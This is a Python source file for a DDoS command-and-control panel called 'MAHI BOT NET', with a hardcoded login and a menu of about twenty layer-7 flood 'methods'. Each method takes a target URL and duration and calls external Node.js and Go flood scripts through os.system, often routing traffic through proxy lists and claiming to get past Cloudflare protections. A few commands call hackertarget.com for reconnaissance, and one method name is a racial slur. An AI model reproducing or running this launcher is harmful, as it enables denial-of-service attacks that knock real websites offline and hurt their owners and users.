import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()


def tools():
    clear()
    print(f'''
\033[37mreverseip► Chek url for ip
\033[37mdns ► Check dns
\033[37masn-lookup ► asn lookup
\033[37msubnet-lookup  ►  Subnet lookup
\033[37mreverse-dns ►  Reverse dns
''')

def rules():
    clear()
    print(f'''
                1.BOTNET OWNER MAHI 
                
''')
    
def layer7():
    clear()
    print("""

 
##   ##    ##     ###  ##    ####            ### ##    ## ##   #### ##           ###  ##  ### ###  #### ##  
 ## ##      ##     ##  ##     ##              ##  ##  ##   ##  # ## ##             ## ##   ##  ##  # ## ##  
# ### #   ## ##    ##  ##     ##              ##  ##  ##   ##    ##               # ## #   ##        ##     
## # ##   ##  ##   ## ###     ##              ## ##   ##   ##    ##               ## ##    ## ##     ##     
##   ##   ## ###   ##  ##     ##              ##  ##  ##   ##    ##               ##  ##   ##        ##     
##   ##   ##  ##   ##  ##     ##              ##  ##  ##   ##    ##               ##  ##   ##  ##    ##     
##   ##  ###  ##  ###  ##    ####            ### ##    ## ##    ####             ###  ##  ### ###   ####    
                                                                                                            

    
                        
                                                                                       
                                                      
\033[35mBOT NET OWNER MAHI 👾
\033[37mWelcome To MAHI BOT NET 👾
\033[38;5;220m
]-------------------------------------[

[ LAYER - 7 ]

\033[33m
\033[38;5;208m–                     
                                         1 .CFSOCKET | [BASIC]
–                                        2 .CFSTRONG | [BASIC]
–                                        3 .HENTAI | [VVIP]
–                                        4 .RAW | [NORMAL]
–                                        5 .SLOW | [NORMAL]
–                                        6 .BRUST | [BASIC]
–                                        7 .GLACIER | [BASIC]
–                                        8 .TLS-V2 | [VVIP]
–                                        9 .HTTPS | [VIP]
–                                       10 .EVOLUTIONS | [VIP]
–                                       11 .CRASH | [VIP]
–                                       12 .BYPASS | [VIP]
–                                       13 .XV | [VIP]
–                                       14 .BASIC | [NORMAL]
–                                       15 .IMPROVED | [NORMAL]
–                                       16 .BUG | [VIP]
–                                       17 .BIGSIZE | [VIP]
–                                       18 .NIGGER | [VIP]
–                                       19 .HOLD | [VVIP]
–                                       20 .LOADDER | [VIP]


\033[38;5;220m

[ HENTAI-BOTNET ]

]-------------------------------------[
\033[0m
""")

def exit_program():
    clear()
    sys.exit()
    print('''C2 Exit''')


def menu():
    sys.stdout.write(f"         \x1b]2; Awami League C2 PANEL--> Stars: [{bots}] | Online Users: [50] | Methods: [18] | Bypass: [18]\x07")
    clear()
    print("""

 
 ##   ##    ##     ###  ##    ####            ### ##    ## ##   #### ##           ###  ##  ### ###  #### ##  
 ## ##      ##     ##  ##     ##              ##  ##  ##   ##  # ## ##             ## ##   ##  ##  # ## ##  
# ### #   ## ##    ##  ##     ##              ##  ##  ##   ##    ##               # ## #   ##        ##     
## # ##   ##  ##   ## ###     ##              ## ##   ##   ##    ##               ## ##    ## ##     ##     
##   ##   ## ###   ##  ##     ##              ##  ##  ##   ##    ##               ##  ##   ##        ##     
##   ##   ##  ##   ##  ##     ##              ##  ##  ##   ##    ##               ##  ##   ##  ##    ##     
##   ##  ###  ##  ###  ##    ####            ### ##    ## ##    ####             ###  ##  ### ###   ####    
                                                                                                            


                                                                                       
                                        
 \033[38mWelcome - MAHI BOT NET 🚀
 
\033[37mWelcome To MAHI BOT NET Type [help] To Start Attack 🚀
""")

def main():
    menu()
    while(True):
        cnc = input('''\033[38;5;208m┌──(root㉿MAHI BOT NET)-[\033[32m/Attack\033[38;5;208m]\033[0m
\033[38;5;208m└─\033[0m#\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m''')
        if cnc == "method" or cnc == "methods" or cnc == "METHODS" or cnc == "METHOD":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "exit" or cnc == "ext" or cnc == "EXIT" or cnc == "Exit":
            exit_program()


# LAYER 7 METHODS
 
        elif "CFSOCKET" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node cf1.js {url} {time}')
            except IndexError:
                print('Usage: CFSOCKET  <target> <time>')
                
        elif "CFSTRONG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node cf2.js {url} {time} 10 GET proxy.txt 150')
            except IndexError:
                print('Usage: CFSTRONG <url> <time> <thread> <GET/POST> <proxy> <rps>')
                
        elif "HENTAI" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'go run hentai.go -host {url} -time {time}')
            except IndexError:
                print('Usage: HENTAI <url> <time>')
                
        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                ascii_vro()
                os.system(f'go run xcddos.go -site {url} -data {method}')
            except IndexError:
                print('Usage: FLOOD -site <url> -data <method GET/POST>')
                
        elif "SLOW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node lol.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Usage: SLOW <url> <time> <rate> <thread> <proxy>')
                
        elif "BRUST" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'go run strike.go {url} {time} {rate} {proxy} {thread}')
            except IndexError:
                print('Usage: BRUST <url> <time> <ratelimit> <proxy> <thread>')
                
        elif "BLOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node bypassUAM.js {url} {time} {rate} {proxy} {thread}')
            except IndexError:
                print('Usage: BLOD <url> <time> <ratelimit> <rate> proxy> <thread>')
                
                
        elif "GLACIER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                proxy = cnc.split()[4]
                method = cnc.split()[5]
                ascii_vro()
                os.system(f'node CF-GLACIER.js {method} {url} {proxy} {time} {rps}')
            except IndexError:
                print('Usage: GLACIER <GET/POST> <url> <proxy> <time> <rps>')
                
        elif "TLS-V2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node TLS-V2.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: TLS-V2 <url> <time> <rps> <thread>')
                
        elif "RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node RAW.js {url} {time}')
            except IndexError:
                print('Usage: TLS-V2 <url> <time>')
                
        elif "HTTPS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node HTTP.js {url} {time} {thread} {rps} {proxy}')
            except IndexError:
                print('Usage: HTTPS <url> <time> <thread> <rps> <proxy>')
                
        elif "EVOLUTIONS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node EVOLUTIONS.js {url} {thread} {rps} {time}')
            except IndexError:
                print('Usage: EVOLUTIONS <url> <thread> <rps> <time>')
                
        elif "CRASH" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node narutov1.js {url} {time} {rate} {thread}')
            except IndexError:
                print('Usage: CRASH <url> <time> <rate> <thread>')
                
        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node NOX.js {url} {time} {thread} {rps} {proxy}')
            except IndexError:
                print('Usage: BYPASS <url> <time> <thread> <rps> <proxy>')
                
        elif "XV" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                method = cnc.split()[5]
                ascii_vro()
                os.system(f'node http-xv.js {method} {thread} {url} {time} {rate}')
            except IndexError:
                print('Usage: XV <method GET> <thread> <url> <time> <rate>')
                
        elif "IMPROVED" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node improved-tls.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: IMPROVED <url> <time> <rps> <thread> <proxy>')
                
        elif "BASIC" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node anus.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: BASIC <url> <time> <rps> <thread> <proxy>')
                
        elif "BUG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node improved-tls.js {url} {time} 100 5 proxy.txt')
                os.system(f'node http-xv.js POST 5 {url} {time} 70')
                os.system(f'node anus.js {url} {time} 64 10 proxy.txt')
                os.system(f'node narutov1.js {url} {time} 64 5')
                os.system(f'node EVOLUTIONS.js {url} 5 64 {time}')
                os.system(f'node NOX.js {url} {time} 5 64 proxy.txt')
            except IndexError:
                print('Usage: BUG <url> <time>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "NIGGER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node HTTP.js {url} {time} 10 64 proxy.txt')
                os.system(f'node HTTP-ENTOD.js {url} {time} ua.txt 10 GET proxy.txt proxies.txt')
                os.system(f'node RAW.js {url} {time}')
                os.system(f'node TLS-V2.js {url} {time} 64 10')
                os.system(f'go run hentai.go -host {url} -time {time}')
                os.system(f'go run strike.go {url} {time} 64 proxy.txt 10')
                os.system(f'go run xcddos.go -site {url} -data {method}')
            except IndexError:
                print('Usage: BUG <url> <time>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "BIGSIZE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'./BOLT {url} {time} 64 10')
                os.system(f'./OMG GET {url} proxy.txt {time} 64 10')
            except IndexError:
                print('Usage: BIGSIZE <url> <time>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "HOLD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node hold.js {url} {time} 64 10 proxy.txt')
                os.system(f'node gflood.js {url} {time} 64 10 proxy.txt')
            except IndexError:
                print('Usage: HOLD <url> <time>')
                
        elif "LOADDER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node gflood.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: LOADDER <url> <time> <rps> <thread> <proxy>')
                
       
       
#TOOLS

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns <dns>')
                print('Example: dns google.com')

        elif "reverse-dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')
                

        elif "help" in cnc:
            print(f'''
METHODS ► SHOW ALL METHODS
CLEAR    ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "MAHI BOT NET"
    passwd = "MAHI BOT NET"
    username = input(" 🚀 Username: ")
    password = getpass.getpass(prompt='🚀 Password: ')
    if username != user or password != passwd:
        print("")
        print("🚀 Wrong Pass.")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🚀 Welcome to MAHI BOT NET")
        main()

login()